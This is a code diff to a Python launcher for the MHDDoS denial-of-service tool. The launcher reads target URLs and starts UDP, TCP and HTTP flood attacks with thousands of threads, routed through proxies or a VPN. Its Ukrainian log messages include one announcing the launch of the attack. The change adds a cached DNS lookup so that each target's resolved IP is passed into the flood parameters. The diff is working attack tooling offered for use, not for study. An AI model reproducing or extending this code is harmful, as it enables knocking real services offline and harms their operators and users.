@@ -1,13 +1,16 @@
 import argparse
 import os
 import random
+import socket
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from functools import lru_cache
 from multiprocessing import cpu_count
 from threading import Thread
 
 import requests
 from PyRoxy import Proxy
+from yarl import URL
 
 from mhddos.start import logger, Methods, bcolors, main as mhddos_main
 
@@ -19,6 +22,14 @@ LOW_RPC = 1000
 
 THREADS_PER_CORE = 1000
 MAX_DEFAULT_THREADS = 4000
+
+
+@lru_cache
+def resolve_host(url):
+    try:
+        return socket.gethostbyname(URL(url).host)
+    except socket.gaierror:
+        exit(f'Невалідна ціль {url} - перевірте правильність написання')
 
 
 class Targets:
@@ -118,20 +129,21 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
     params_list = []
     proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
     for target in targets:
+        ip = resolve_host(target)
         # UDP
         if target.lower().startswith('udp://'):
             logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
-            params_list.append(['UDP', target[6:], UDP_THREADS, period])
+            params_list.append(['UDP', target[6:], ip, UDP_THREADS, period])
 
         # TCP
         elif target.lower().startswith('tcp://'):
-            params_list.append(['TCP', target[6:], threads_per_target, period, proxy_file])
+            params_list.append(['TCP', target[6:], ip, threads_per_target, period, proxy_file])
 
         # HTTP(S)
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append([method, target, threads, period, proxy_file, rpc])
+                params_list.append([method, target, ip, threads, period, proxy_file, rpc])
 
     logger.info(f'{bcolors.OKGREEN}Запускаємо атаку...{bcolors.RESET}')
     for params in params_list:
